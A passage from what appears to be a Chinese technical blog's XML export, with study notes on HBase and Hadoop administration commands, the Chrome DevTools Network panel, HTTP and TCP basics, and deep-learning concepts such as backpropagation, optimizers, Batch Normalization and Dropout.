&apos;table&apos;,&apos;id&apos;,&apos;column_famaly1:addr&apos;COUNTER VALUE = 20 row(s) hbase(main):004:0&gt; get &apos;table&apos;,&apos;id&apos;,&apos;column_famaly1:addr&apos;COLUMN CELL column_famaly1:addr timestamp=1463056705124, value=\x00\x00\x00\x00\x00\x00\x0 0\x02 1 row(s) hbase(main):005:0&gt; incr &apos;table&apos;,&apos;id&apos;,&apos;column_famaly1:addr&apos;COUNTER VALUE = 30 row(s) 11)获取计数器当前值 get_counter &#39;tablename&#39;,&#39;rowkey&#39;,&#39;column family:column&#39; 权限管理1）分配权限123456789语法 : grant &lt;user&gt; &lt;permissions&gt; &lt;table&gt; &lt;column family&gt; &lt;column qualifier&gt; 参数后面用逗号分隔权限用五个字母表示： &quot;RWXCA&quot;.READ(&apos;R&apos;), WRITE(&apos;W&apos;), EXEC(&apos;X&apos;), CREATE(&apos;C&apos;), ADMIN(&apos;A&apos;)例如，给用户‘test&apos;分配对表t1有读写的权限，hbase(main)&gt; grant &apos;test&apos;,&apos;RW&apos;,&apos;t1&apos; 2）查看权限123语法：user_permission &lt;table&gt;例如，查看表t1的权限列表hbase(main)&gt; user_permission &apos;t1&apos; 3）收回权限1234与分配权限类似，语法：revoke &lt;user&gt; &lt;table&gt; &lt;column family&gt; &lt;column qualifier&gt;例如，收回test用户在表t1上的权限hbase(main)&gt; revoke &apos;test&apos;,&apos;t1&apos; 4)将表设置为只读模式alter ‘tablename’,READONLY 表数据的增删改查添加数据12345语法：put &lt;table&gt;,&lt;rowkey&gt;,&lt;family:column&gt;,&lt;value&gt;,&lt;timestamp&gt;例如：给表t1的添加一行记录：rowkey是rowkey001，family name：f1，column name：col1，value：value01，timestamp：系统默认hbase(main)&gt; put &apos;t1&apos;,&apos;rowkey001&apos;,&apos;f1:col1&apos;,&apos;value01&apos; 查询数据a）查询某行记录1234567891011语法：get &lt;table&gt;,&lt;rowkey&gt;,[&lt;family:column&gt;,....]例如：查询表t1，rowkey001中的f1下的col1的值hbase(main)&gt; get &apos;t1&apos;,&apos;rowkey001&apos;, &apos;f1:col1&apos;或者：hbase(main)&gt; get &apos;t1&apos;,&apos;rowkey001&apos;, &#123;COLUMN=&gt;&apos;f1:col1&apos;&#125;查询表t1，rowke002中的f1下的所有列值hbase(main)&gt; get &apos;t1&apos;,&apos;rowkey001&apos; b）扫描表1234567语法：scan &lt;table&gt;, &#123;COLUMNS =&gt; [ &lt;family:column&gt;,.... ], LIMIT =&gt; num&#125;另外，还可以添加STARTROW、TIMERANGE和FITLER等高级功能例如：扫描表t1的前5条数据hbase(main)&gt; scan &apos;t1&apos;,&#123;LIMIT=&gt;5&#125; c）查询表中的数据行数1234567语法：count &lt;table&gt;, &#123;INTERVAL =&gt; intervalNum, CACHE =&gt; cacheNum&#125;INTERVAL设置多少行显示一次及对应的rowkey，默认1000；CACHE每次去取的缓存区大小，默认是10，调整该参数可提高查询速度例如，查询表t1中的行数，每100条显示一次，缓存区为500hbase(main)&gt; count &apos;t1&apos;, &#123;INTERVAL =&gt; 100, CACHE =&gt; 500&#125; 删除数据a )删除行中的某个列值1234567语法：delete &lt;table&gt;, &lt;rowkey&gt;, &lt;family:column&gt; , &lt;timestamp&gt;,必须指定列名例如：删除表t1，rowkey001中的f1:col1的数据hbase(main)&gt; delete &apos;t1&apos;,&apos;rowkey001&apos;,&apos;f1:col1&apos;注：将删除改行f1:col1列所有版本的数据 b )删除行12345语法：deleteall &lt;table&gt;, &lt;rowkey&gt;, &lt;family:column&gt; , &lt;timestamp&gt;，可以不指定列名，删除整行数据例如：删除表t1，rowk001的数据hbase(main)&gt; deleteall &apos;t1&apos;,&apos;rowkey001&apos; c）删除表中的所有数据1234567语法： truncate &lt;table&gt;其具体过程是：disable table -&gt; drop table -&gt; create table例如：删除表t1的所有数据hbase(main)&gt; truncate &apos;t1&apos; 组命令Group name1)查看当前集群状态 status 2)查看当前用户是谁 whoami 3)创建命名空间 create_namespace &#39;ns name&#39; 4)查看有哪些命名空间 list_namespace 5)删除命名空间 drop_namespace &#39;ns name&#39; Region管理1）移动region123456语法：move &apos;encodeRegionName&apos;, &apos;ServerName&apos;encodeRegionName指的regioName后面的编码，ServerName指的是master-status的Region Servers列表示例:hbase(main)&gt;move &apos;4343995a58be8e5bbc739af1e91cd72d&apos;, &apos;db-41.xxx.xxx.org,60020,1390274516739&apos; 2）开启/关闭region123语法：balance_switch true|falsehbase(main)&gt; balance_switch 3）手动split 语法：split &#39;regionName&#39;, &#39;splitKey&#39; 4）手动触发major compaction123456789语法：Compact all regions in a table:hbase&gt; major_compact &apos;t1&apos;Compact an entire region:hbase&gt; major_compact &apos;r1&apos;Compact a single column family within a region:hbase&gt; major_compact &apos;r1&apos;, &apos;c1&apos;Compact a single column family within a table:hbase&gt; major_compact &apos;t1&apos;, &apos;c1&apos; 配置管理及节点重启1）修改hdfs配置hdfs配置位置：/etc/hadoop/conf1234567891011同步hdfs配置cat /home/hadoop/slaves|xargs -i -t scp /etc/hadoop/conf/hdfs-site.xml hadoop@&#123;&#125;:/etc/hadoop/conf/hdfs-site.xml关闭：cat /home/hadoop/slaves|xargs -i -t ssh hadoop@&#123;&#125; &quot;sudo /home/hadoop/cdh4/hadoop-2.0.0-cdh4.2.1/sbin/hadoop-daemon.sh --config /etc/hadoop/conf stop datanode&quot;启动：cat /home/hadoop/slaves|xargs -i -t ssh hadoop@&#123;&#125; &quot;sudo /home/hadoop/cdh4/hadoop-2.0.0-cdh4.2.1/sbin/hadoop-daemon.sh --config /etc/hadoop/conf start datanode&quot; 2）修改hbase配置hbase配置位置：12345678同步hbase配置cat /home/hadoop/hbase/conf/regionservers|xargs -i -t scp /home/hadoop/hbase/conf/hbase-site.xml hadoop@&#123;&#125;:/home/hadoop/hbase/conf/hbase-site.xml graceful重启cd ~/hbasebin/graceful_stop.sh --restart --reload --debug inspurXXX.xxx.xxx.org MapReduceMapReduce是一种编程模型，用于大规模数据集（大于1TB）的并行运算。概念”Map（映射）”和”Reduce（归约）”，是它们的主要思想，都是从函数式编程语言里借来的，还有从矢量编程语言里借来的特性。 MapReduce是面向大数据并行处理的计算模型、框架和平台。 经典教程：大数据技术原理与应用 MOOC 慕课使用Eclipse编译运行MapReduce程序_Hadoop2.6.0_Ubuntu/CentOS使用命令行编译打包运行自己的MapReduce程序 Hadoop2.6.0 爬坑1234567891011121314error：hadoop@Master:/usr/local/hadoop$ bin/hdfs dfs -put etc/hadoop inputput: `input&apos;: No such file or directoryas: 主要是命令老了吧hadoop@Master:/usr/local/hadoop$ ./bin/hdfs dfs -mkdir -p /user/hadoophadoop@Master:/usr/local/hadoop$ ./bin/hdfs dfs -mkdir -p /user/hadoop/inputhadoop@Master:/usr/local/hadoop$ hadoop fs -put /usr/local/hadoop/etc/hadoop/hdfs-site.xml /user/hadoop/inputhadoop@Master:/usr/local/hadoop$ hadoop fs -put /usr/local/hadoop/etc/hadoop/core-site.xml /user/hadoop/inputerror:有时候一些 eclipse 插件安装之后，打开 eclipse 死活都不显示as:把 eclipse/configuration/org.eclipse.update 删除掉 Hive （数据仓库工具）hive 是基于Hadoop的一个数据仓库工具，可以将结构化的数据文件映射为一张数据库表，并提供简单的sql查询功能，可以将sql语句转换为MapReduce任务进行运行。 其优点是学习成本低，可以通过类SQL语句快速实现简单的MapReduce统计，不必开发专门的MapReduce应用，十分适合数据仓库的统计分析。 Hue 是cdh专门的一套web管理器，它包括3个部分hue ui，hue server，hue db。hue提供所有的cdh组件的shell界面的接口。你可以在hue编写mr，查看修改hdfs的文件，管理hive的元数据，运行Sqoop，编写Oozie工作流等大量工作。 经典教程大数据技术原理与应用 第十四章 基于Hadoop的数据仓库Hive 学习指南—–包含基本命令Hive的可视化操作(Hue)Hue官方教程高可用Hadoop平台－Hue In Hadoop 爬坑mysql的连接jar版本；HDFS的文件、缓存似乎也有影响mysql的账号密码很坑hive的配置修改一定不能错 sqoopSqoop(发音：skup)是一款开源的工具，主要用于在Hadoop(Hive)与传统的数据库(mysql、postgresql…)间进行数据的传递，可以将一个关系型数据库（例如 ： MySQL ,Oracle ,Postgres等）中的数据导进到Hadoop的HDFS中，也可以将HDFS的数据导进到关系型数据库中。 经典教程Ubuntu安装Sqoop大数据案例-步骤一:本地数据集上传到数据仓库Hive大数据案例-步骤二：Hive数据分析大数据案例-步骤三：Hive、MySQL、HBase数据互导大数据案例-步骤四:利用R进行数据可视化分析 scalaScala是一门现代的多范式编程语言，平滑地集成了面向对象和函数式语言的特性，旨在以简练、优雅的方式来表达常用编程模式。Scala的设计吸收借鉴了许多种编程语言的思想，只有很少量特点是Scala自己独有的。Scala语言的名称来自于“可伸展的语言”，从写个小脚本到建立个大系统的编程任务均可胜任。Scala运行于Java平台（JVM，Java 虚拟机）上，并兼容现有的Java程序，Scala代码可以调用Java方法，访问Java字段，继承Java类和实现Java接口。在面向对象方面，Scala是一门非常纯粹的面向对象编程语言，也就是说，在Scala中，每个值都是对象，每个操作都是方法调用。 Spark的设计目的之一就是使程序编写更快更容易，这也是Spark选择Scala的原因所在。 Scala简介 经典教程子雨大数据之Spark入门教程（Scala版） 🐂🍺Scala安装 Spark经典教程厦门大学的Python入门教程子雨大数据之Spark入门教程(Python版) zookeeperZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。ZooKeeper的目标就是封装好复杂易出错的关键服务，将简单易用的接口和性能高效、功能稳定的系统提供给用户。ZooKeeper包含一个简单的原语集， 提供Java和C的接口。ZooKeeper代码版本中，提供了分布式独享锁、选举、队列的接口，代码在zookeeper-3.4.3\src\recipes。其中分布锁和队列有Java和C两个版本，选举只有Java版本。]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>Hadoop</tag>
        <tag>spark</tag>
        <tag>hive</tag>
        <tag>hbase</tag>
        <tag>MapReduce</tag>
        <tag>sqoop</tag>
        <tag>scala</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web协议详解与抓包实战]]></title>
    <url>%2Fweb%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3%E4%B8%8E%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%2F</url>
    <content type="text"><![CDATA[基于 ABNF 语义定义的HTTP消息格式维基百科 chrome Network结构Elements（元素面板）：使用“元素”面板可以通过自由操纵DOM和CSS来重演您网站的布局和设计。 Console（控制台面板）：在开发期间，可以使用控制台面板记录诊断信息，或者使用它作为 shell，在页面上与JavaScript交互 Sources（源代码面板）：在源代码面板中设置断点来调试 JavaScript ，或者通过Workspaces（工作区）连接本地文件来使用开发者工具的实时编辑器 Network（网络面板）：从发起网页页面请求Request后得到的各个请求资源信息（包括状态、资源类型、大小、所用时间等），并可以根据这个进行网络性能优化 Performance（性能面板）：使用时间轴面板，可以通过记录和查看网站生命周期内发生的各种事件来提高页面运行时的性能 Memory（内存面板）：分析web应用或者页面的执行时间以及内存使用情况 Application（应用面板）：记录网站加载的所有资源信息，包括存储数据（Local Storage、Session Storage、-IndexedDB、Web SQL、Cookies）、缓存数据、字体、图片、脚本、样式表等 Security（安全面板）：使用安全面板调试混合内容问题，证书问题等等 Audits（审核面板）：对当前网页进行网络利用情况、网页性能方面的诊断，并给出一些优化建议。比如列出所有没有用到的CSS文件等 Filters（过滤器）domain：仅显示来自指定域的资源。您可以使用通配符（）来包括多个域。例如，.com显示以.com结尾的所有域名中的资源。 DevTools会在自动完成下拉菜单中自动填充它遇到的所有域。 has-response-header：显示包含指定HTTP响应头信息的资源。 DevTools会在自动完成下拉菜单中自动填充它遇到的所有响应头。 is：通过is:running找出WebSocket请求。 larger-than(大于)：显示大于指定大小的资源（以字节为单位）。设置值1000等效于设置值1k。 method(方法)：显示通过指定的HTTP方法类型检索的资源。DevTools使用它遇到的所有HTTP方法填充下拉列表。 mime-type（mime类型：显示指定MIME类型的资源。 DevTools使用它遇到的所有MIME类型填充下拉列表。 mixed-content（混合内容：显示所有混合内容资源（mixed-content:all）或仅显示当前显示的内容（mixed-content:displayed）。 Scheme（协议）：显示通过不受保护的HTTP（scheme:http）或受保护的HTTPS（scheme:https）检索的资源。 set-cookie-domain（cookie域）：显示具有Set-Cookie头,并且其Domain属性与指定值匹配的资源。DevTools会在自动完成下拉菜单中自动填充它遇到的所有Cookie域。 set-cookie-name（cookie名）：显示具有Set-Cookie头,并且名称与指定值匹配的资源。DevTools会在自动完成下拉菜单中自动填充它遇到的所有Cookie名。 set-cookie-value（cookie值）：显示具有Set-Cookie头,并且值与指定值匹配的资源。DevTools会在自动完成下拉菜单中自动填充它遇到的所有cookie值。 status-code（状态码）：仅显示其HTTP状态代码与指定代码匹配的资源。DevTools会在自动完成下拉菜单中自动填充它遇到的所有状态码。 Controls（控件）使用这些选项可以控制 Network(网络)面板的外观和功能 1234567Preserve log：是网络日志记录,如果勾上,页面刷新后,日志也不会消失(这功能很有用,比如页面跳转后,你想看页面跳转前发出的请求有哪些,比如查看别人网站登录请求,登录成功返回什么,登录成功后又发起了些什么请求,重定向到什么地址)Disable cache：缓存开关Online：网络控制Group by frame：勾选了该选项后,会对网络请求按表单名称进行分组 Overview（概览）这个图表显示检索资源的时间轴。如果您看到多个垂直堆叠的栏，这意味着这些资源被同时检索。 Requests Table（请求列表）此列表列出了检索的每个资源。默认情况下，此表按时间顺序排序，也就是最早的资源在顶部。单击资源名称可以获得更多信息。提示：右键单击列表的任何标题栏可以以添加或删除信息列。12345678捕获屏幕Controls 窗格包括的功能有网络日志录制、日志清理、捕获屏幕、过滤器，视图切换、保留日志开关、Cache开关、网络连接开关、网速阀值。以捕获屏幕为例，点击摄像机按钮（捕获屏幕），重新加载页面即可捕获屏幕。双击其中的截屏可以放大显示，在放大的图下方可以点击跳转到上一帧或者下一帧。单击则可以查看该帧被捕获时的网络请求信息，并且在Overview上会有一条黄色竖线以标记该帧被捕获的具体时间点。 1234567891011Name 资源名称，点击名称可以查看资源的详情情况，包括Headers、Preview、Response、Cookies、Timing。Status HTTP状态码。Type 请求的资源MIME类型。Initiator 标记请求是由哪个对象或进程发起的（请求源）。Parser： 请求由Chrome的HTML解析器时发起的。Redirect：请求是由HTTP页面重定向发起的。Script：请求是由Script脚本发起的。Other：请求是由其他进程发起的，比如用户点击一个链接跳转到另一个页面或者在地址栏输入URL地址。Size 从服务器下载的文件和请求的资源大小。如果是从缓存中取得的资源则该列会显示(from cache)Time 请求或下载的时间，从发起Request到获取到Response所用的总时间。Timeline 显示所有网络请求的可视化瀑布流(时间状态轴)，点击时间轴，可以查看该请求的详细信息，点击列头则可以根据指定的字段可以排序。 123456789101112131415Headers：与资源关联的 HTTP 标头。Preview：JSON、图像和文本资源的预览。Response：HTTP 响应数据（如果存在）。Timing：资源请求生命周期的精细分解。Headers（查看 HTTP 标头） 点击 Headers 可以显示该资源的标头。 Headers 标签可以显示资源的请求网址、HTTP 方法以及响应状态代码。 此外，该标签还会列出 HTTP 响应和请求标头、它们的值以及任何查询字符串参数····可以自定义添加列···· 查看 Cookie点击 Cookies 标签可以查看在资源的 HTTP 请求和响应标头中传输的 Cookie 表。 只有传输 Cookie 时，此标签才可用。 下面是 Cookie 表中每一列的说明： Name：Cookie 的名称。 Value：Cookie 的值。 Domain：Cookie 所属的域。 Path：Cookie 来源的网址路径。 Expires / Max-Age：Cookie 的 expires 或 max-age 属性的值。 Size：Cookie 的大小（以字节为单位）。 HTTP：指示 Cookie 应仅由浏览器在 HTTP 请求中设置，而无法通过 JavaScript 访问。 Secure：如果存在此属性，则指示 Cookie 应仅通过安全连接传输。 复制、保存和清除网络信息 Copy Response（复制响应）将所选资源的HTTP响应复制到系统剪贴板。 Copy as cURL（复制为cURL）将所选资源的网络请求作为cURL命令字符串复制到系统剪贴板。 请参阅将复制请求为cURL命令。 curl命令是一个利用URL规则在命令行下工作的文件传输工具。它支持文件的上传和下载，所以是综合传输工具，但按传统，习惯称curl为下载工具。作为一款强力工具，curl支持包括HTTP、HTTPS、ftp等众多协议，还支持POST、cookies、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。做网页处理流程和数据检索自动化，curl可以祝一臂之力。l Copy All as HAR（全部复制为HAR）将所有资源复制到系统剪贴板作为HAR数据。 HAR文件包含描述网络“瀑布”的JSON数据结构。一些第三方工具可以使用HAR文件中的数据重建网络瀑布。有关详细信息，请参阅Web性能强大工具：HTTP归档（HAR）。 Save as HAR with Content（另存为带内容的HAR）将所有网络数据与每个页面资源一起保存到HAR文件中。 二进制资源（包括图像）被编码为Base64编码文本。 Clear Browser Cache（清除浏览器缓存）清除浏览器高速缓存。提示：您也可以从Network Conditions(网络条件)抽屉式窗格中启用或禁用浏览器缓存。 Clear Browser Cookies（清除浏览器Cookie）清除浏览器的Cookie。 Open in Sources Panel（在源文件面板中打开）在Sources(源文件)面板中打开选定的资源。 Open Link in New Tab（在新标签页中打开链接）在新标签页中打开所选资源。您还可以在Requests Table(请求列表)中双击资源名称。 Copy Link Address（复制链接地址）将资源URL复制到系统剪贴板。 Save（保存）保存所选的文本资源。仅显示在文本资源上。 Replay XHR（重新发送XHR）重新发送所选的XMLHTTPRequest。仅显示在XHR资源上。 查看资源发起者和依赖关系 按住Shift并移动鼠标到资源上可查看它的发起者和依赖关系。这部分是你鼠标悬停的资源的target(目标)引用。 从target(目标)往上查找，第一个颜色编码为绿色的资源是target(目标)的发起者。如果存在第二个颜色编码为绿色资源，那么这个是发起者的发起者。从target(目标)向下查找，任何颜色编码为红色的资源都是target的依赖。 HTTP 协议响应码参考 URI与URLURI：统一资源标示符，只是标识资源在哪里，这意味着存在多个URI可以指向该资源（例如：绝对与相对）【URI包含URL】 URI一般由三部分组成： 1. 访问资源的命名机制。 2. 存放资源的主机名。 3. 资源自身的名称，由路径表示。1234语法：[scheme:] scheme-specific-part URI以scheme和冒号开头。Scheme用大写/小写字母开头，后面为空或者跟着更多的大写/小写字母、数字、加号、减号和点号。冒号把 scheme与scheme-specific-part分开了，并且scheme-specific-part的语法和语义（意思）由URI的名字空间决定。如下面的例子： http://www.cnn.com，其中http是scheme，//www.cnn.com是 scheme-specific-part，并且它的scheme与scheme-specific-part被冒号分开了。 12345绝对与相对： 绝对的URI指以scheme（后面跟着冒号）开头的URI。(例如：mailto:jeff@javajeff.com、news:comp.lang.java.help和xyz: //whatever)；绝对的URI看作是以某种方式引用某种资源，而这种方式对标识符出现的环境没有依赖。 相对的URI不是以scheme（后面跟着冒号）开始的URI。(例如：articles/articles.html、img/aa.jpg)你可以把相对的URI看作是以某种方式引用某种资源，而这种方式依赖于标识符出现的环境。（即你在html中引用图片：./img/aa.jpg，那么它依赖的就是http） URL：统一资源定位符，是URI的子集；它除了标识资源的位置，还提供一种定位该资源的主要访问机制(如其网络“位置”)。【即提供具体方式找到该资源（位置+方式）】 URL的格式由下列三部分组成： 1. 第一部分，是协议或称为服务方式 （指定低层使用的协议，例如：http, https, ftp)； 2. 第二部分，是存有该资源的主机IP地址（有时也包括端口号）； 3. 第三部分，是主机资源的具体地址。如目录和文件名等。 第一部分和第二部分之间用”：//“符号隔开，第二部分和第三部分用”/“符号隔开。第一部分和第二部分是不可缺少的，第三部分有时可以省略。 三次握手四次挥手 上图中主要分为三部分：建立连接、传输数据、断开连接。 建立连接： 三次握手即可建立TCP连接 1、第一次握手：客户端发送syn包(seq=x)到服务器，并进入SYN_SEND状态，等待服务器确认； 2、第二次握手：服务器收到syn包，必须确认客户的SYN(ack=x+1)，同时自己也发送一个SYN包(seq=y)，即SYN+ACK包，此时服务器进入SYN_RECV状态； 3、第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=y+1)，此包发送完毕，客户端和服务器进入ESTABLISHED状态，完成三次握手。 握手过程中传送的包里不包含数据，三次握手完毕后，客户端与服务器才正式开始传送数据。理想状态下，TCP连接一旦建立，在通信双方中的任何一方主动关闭连接之前，TCP 连接都将被一直保持下去。 为什么需要三次握手呢？ 相互确认！ 数据传输： 建立好连接后，开始传输数据。TCP数据传输牵涉到的概念很多：超时重传、快速重传、流量控制、拥塞控制等等。（这一切都是为了提供可靠的字节流服务） 断开连接： 四次握手即可断开TCP连接 1、第一次握手：主动关闭方发送一个FIN，用来关闭主动方到被动关闭方的数据传送，也就是主动关闭方告诉被动关闭方：我已经不会再给你发数据了(当然，在fin包之前发送出去的数据，如果没有收到对应的ack确认报文，主动关闭方依然会重发这些数据)，但此时主动关闭方还可以接受数据。 2、第二次握手：被动关闭方收到FIN包后，发送一个ACK给对方，确认序号为收到序号+1(与SYN相同，一个FIN占用一个序号)。 3、第三次握手：被动关闭方发送一个FIN，用来关闭被动关闭方到主动关闭方的数据传送，也就是告诉主动关闭方，我的数据也发送完了，不会再给你发数据了。 4、第四次握手：主动关闭方收到FIN后，发送一个ACK给被动关闭方，确认序号为收到序号+1，至此，完成四次挥手。123456789白话文： 1、第一次握手，浏览器对服务器说：“煞笔，我不再给你发数据啦，但可以接受数据。” 2、第二次握手，服务器对浏览器说：“骚货，我知道啦！” 3、第三次握手，服务器对浏览器说：“骚货，我也不再给你发数据啦！” 4、第四次握手，浏览器对服务器说：“煞笔，我知道啦！” 特点HTTP协议永远都是客户端发起请求，服务器回送响应。这样就限制了使用HTTP协议，无法实现在客户端没有发起请求的时候，服务器将消息推送给客户端。、 主要特点： 1、支持客户/服务器模式。一旦建立了运输连接（这常常称为建立了会话），浏览器端就向万维网服务器端发送HTTP请求，服务器收到请求后给出HTTP响应。 2、简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。每种方法规定了客户与服务器联系的类型不同。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。 3、灵活：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。 4、HTTP 0.9和1.0使用非持续连接：限制每次连接只处理一个请求，服务器处理完客户的请求，并收到客户的应答后，即断开连接。HTTP 1.1使用持续连接：不必为每个web对象创建一个新的连接，一个连接可以传送多个对象，采用这种方式可以节省传输时间。 5、无状态：HTTP协议是无状态协议。即每一个HTTP请求都是独立的。万维网服务器不保存过去的请求和过去的会话记录。这就是说，同一个用户再次访问同一个服务器时，只要服务器没有进行内容的更新，服务器的响应就给出和以前被访问时相同的响应。服务器不记录曾经访问过的用户，也不记录某个用户访问过多少次。 HTTP请求请求方法 1、GET：向特定的资源发出请求 2、POST：向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。 3、PUT：向指定资源位置上传其最新内容。 4、DELETE：请求服务器删除Request-URI所标识的资源。 5、HEAD： 向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。该方法常用于测试超链接的有效性，是否可以访问，以及最近是否更新。 6、TRACE：请求服务器会送收到的请求信息，主要用于测试或诊断。 7、OPTIONS：请求查询服务器的性能，或者查询与资源相关的选项和需求 8、CONNECT： HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。（即留为将来使用） 【注意：请求方法区分大小写；所示请求方法应为大写】 非持久连接方式持久连接方式参考资料Chrome开发者工具详解(2)-Network面板Google Chrome抓包分析详解Chrome DevTools — NetworkHTTP协议详解以及URL具体访问过程]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>Wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《深度学习》读书笔记]]></title>
    <url>%2F%E3%80%8A%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[day1：感知机卡day2: 神经网络1day3: 神经网络2day4: 数据知识卡1day5: 数据知识卡2day6: 计算图卡误差反向传播法：理解的话两种方法，一种是基于数学式：另一种是基于计算图（computational graph）。 计算图计算图将计算过程用图形表示出来。这里说的图形是数据结构图，通过多个节点和边表示（连接节点的直线称为“边”）。 从左向右进行计算”是一种正方向上的传播，简称为正向传播（forward propagation）。正向传播是从计算图出发点到结束点的传播。 从右向左的传播称为反向传播（backward propagation）。反向传播将在接下来的导数计算中发挥重要作用。 局部计算“局部”这个词的意思是“与自己相关的某个小范围”。局部计算是指，无论全局发生了什么，都能只根据与自己相关的信息输出接下来的结果。 废话这么多 就是局部 局部 局部 的意思嘛。 为何用计算图解题化繁为简，简化问题。 PS：而反向传播将局部导数向正方向的反方向（从右到左）传递？？ 链式法则传递这个局部导数的原理，是基于链式法则（chain rule）的。 如果某个函数由复合函数表示，则该复合函数的导数可以用构成复合函数的各个函数的导数的乘积表示。 计算图的反向传播 计算图的反向传播：沿着与正方向相反的方向，乘上局部导数 链式法则和计算图反向传播加法节点的反向传播day7 层卡day8 参数技巧卡1参数的更新神经网络的学习的目的是找到使损失函数的值尽可能小的参数。这是寻找最优参数的问题，解决这个问题的过程称为最优化（optimization）。 SGD 随机梯度下降法（stochastic gradient descent）：为了找到最优参数，我们将参数的梯度（导数）作为了线索。使用参数的梯度，沿梯度方向更新参数，并重复这个步骤多次，从而逐渐靠近最优参数。 SGD 的缺点：如果函数的形状非均向（anisotropic），比如呈延伸状，搜索的路径就会非常低效。因此，我们需要比单纯朝梯度方向前进的 SGD 更聪明的方法。SGD 低效的根本原因是，梯度的方向并没有指向最小值的方向。 MomentumAdaGrad在神经网络的学习中，学习率（数学式中记为 η）的值很重要。学习率过小，会导致学习花费过多时间；反过来，学习率过大，则会导致学习发散而不能正确进行。 学习率衰减（learning rate decay）：即随着学习的进行，使学习率逐渐减小。实际上，一开始“多”学，然后逐渐“少”学的方法，在神经网络的学习中经常被使用。 AdamAdam 是 2015 年提出的新方法。它的理论有些复杂，直观地讲，就是融合了 Momentum 和 AdaGrad 的方法。通过组合前面两个方法的优点，有望实现参数空间的高效搜索。此外，进行超参数的“偏置校正”也是 Adam 的特征。 权重的初始值在神经网络的学习中，权重的初始值特别重要。实际上，设定什么样的权重初始值，经常关系到神经网络的学习能否成功。 为了防止“权重均一化”（严格地讲，是为了瓦解权重的对称结构），必须随机生成初始值。不可以将权重初始值设为 0 。 隐藏层的激活值的分布梯度消失：各层的激活值呈偏向 0 和 1 的分布。这里使用的 sigmoid 函数是 S 型函数，随着输出不断地靠近 0（或者靠近 1），它的导数的值逐渐接近 0。因此，偏向 0 和 1 的数据分布会造成反向传播中梯度的值不断变小，最后消失。层次加深的深度学习中，梯度消失的问题可能会更加严重。 ReLU的权重初始值Xavier 初始值是以激活函数是线性函数为前提而推导出来的。因为 sigmoid 函数和 tanh 函数左右对称，且中央附近可以视作线性函数，所以适合使用 Xavier 初始值。但当激活函数使用 ReLU 时，一般推荐使用 ReLU 专用的初始值，也就是 Kaiming He 等人推荐的初始值，也称为“He 初始值”。 总结一下，当激活函数使用 ReLU 时，权重初始值使用 He 初始值，当激活函数为 sigmoid 或 tanh 等 S 型曲线函数时，初始值使用 Xavier 初始值。这是目前的最佳实践。(***) 基于 MNIST 数据集的权重初始值的比较MNIST :是深度学习的经典入门demo，他是由6万张训练图片和1万张测试图片构成的，每张图片都是28*28大小（如下图），而且都是黑白色构成（这里的黑色是一个0-1的浮点数，黑色越深表示数值越靠近1），这些图片是采集的不同的人手写从0到9的数字。TensorFlow将这个数据集和相关操作封装到了库中，下面我们来一步步解读深度学习MNIST的过程。 综上，在神经网络的学习中，权重初始值非常重要。很多时候权重初始值的设定关系到神经网络的学习能否成功。权重初始值的重要性容易被忽视，而任何事情的开始（初始值）总是关键的，因此在结束本节之际，再次强调一下权重初始值的重要性。 Batch NormalizationBatch Normalization 的算法Batch Normalization（下文简称 Batch Norm）是 2015 年提出的方法。Batch Norm 虽然是一个问世不久的新方法，但已经被很多研究人员和技术人员广泛使用。实际上，看一下机器学习竞赛的结果，就会发现很多通过使用这个方法而获得优异结果的例子。 Batch Norm，顾名思义，以进行学习时的 mini-batch 为单位，按 mini-batch 进行正规化。具体而言，就是进行使数据分布的均值为 0、方差为 1 的正规化。用数学式表示的话，如下所示。 ) Batch Normalization 的计算图（引用自文献 [13]）: 优点可以使学习快速进行（可以增大学习率）。不那么依赖初始值（对于初始值不用那么神经质）。抑制过拟合（降低 Dropout 等的必要性）。 Batch Normalization的评估综上，通过使用 Batch Norm，可以推动学习的进行。并且，对权重初始值变得健壮（“对初始值健壮”表示不那么依赖初始值）。Batch Norm 具备了如此优良的性质，一定能应用在更多场合中。 有点难吧 代码还没跑 好菜哦、、、、慢慢消化。。。。。 day9 参数技巧卡2正则化过拟合过拟合指的是只能拟合训练数据，但不能很好地拟合不包含在训练数据中的其他数据的状态。机器学习的目标是提高泛化能力，即便是没有包含在训练数据里的未观测数据，也希望模型可以进行正确的识别。 原因:模型拥有大量参数、表现力强。训练数据少。 权值衰减权值衰减是一直以来经常被使用的一种抑制过拟合的方法。该方法通过在学习的过程中对大的权重进行惩罚，来抑制过拟合。很多过拟合原本就是因为权重参数取值过大才发生的。 但是，如果网络的模型变得很复杂，只用权值衰减就难以应对了。 Dropout Dropout 是一种在学习的过程中随机删除神经元的方法。训练时，随机选出隐藏层的神经元，然后将其删除。被删除的神经元不再进行信号的传递。训练时，每传递一次数据，就会随机选择要删除的神经元。 这个集成学习与 Dropout 有密切的关系,神经网络的识别精度可以提高好几个百分点。 可以将 Dropout 理解为，通过在学习过程中随机删除神经元，从而每一次都让不同的模型进行学习。并且，推理时，通过对神经元的输出乘以删除比例（比如，0.5 等），可以取得模型的平均值。也就是说，可以理解成，Dropout将集成学习的效果（模拟地）通过一个网络实现了。 